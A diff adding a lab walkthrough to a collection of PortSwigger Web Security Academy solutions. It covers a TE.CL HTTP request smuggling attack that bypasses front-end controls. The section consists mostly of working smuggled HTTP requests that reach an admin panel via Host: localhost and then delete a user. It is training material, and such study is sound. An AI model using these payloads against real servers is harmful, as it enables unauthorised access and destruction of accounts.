@@ -10,6 +10,7 @@
 - [HTTP request smuggling, confirming a CL.TE vulnerability via differential responses](#http-request-smuggling-confirming-a-clte-vulnerability-via-differential-responses)
 - [HTTP request smuggling, confirming a TE.CL vulnerability via differential responses](#http-request-smuggling-confirming-a-tecl-vulnerability-via-differential-responses)
 - [Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability](#exploiting-http-request-smuggling-to-bypass-front-end-security-controls-clte-vulnerability)
+- [Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability](#exploiting-http-request-smuggling-to-bypass-front-end-security-controls-tecl-vulnerability)
 
 ## HTTP request smuggling, basic CL.TE vulnerability
 Reference: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te
@@ -226,4 +227,72 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 10
 
 x=
+```
+
+## Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
+Reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl
+
+<!-- omit in toc -->
+### Quick Solution
+This lab is divided in two parts. In the first part the goal is to access the ``/admin`` page, in the second part the goal is to delete a user. So two different requests must be sent. Payloads in the next paragraph.
+
+<!-- omit in toc -->
+### Solution
+1. Try to visit ``/admin`` and observe that the request is blocked.
+2. In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
+3. Using Burp Repeater, issue the following request twice:
+```
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-length: 4
+Transfer-Encoding: chunked
+
+60
+POST /admin HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+```
+4. Observe that the merged request to ``/admin`` was rejected due to not using the header ``Host: localhost``.
+5. Issue the following request twice:
+```
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+71
+POST /admin HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+```
+6. Observe that you can now access the admin panel.
+7. Using the previous response as a reference, change the smuggled request URL to delete the user ``carlos``:
+```
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-length: 4
+Transfer-Encoding: chunked
+
+87
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
 ```
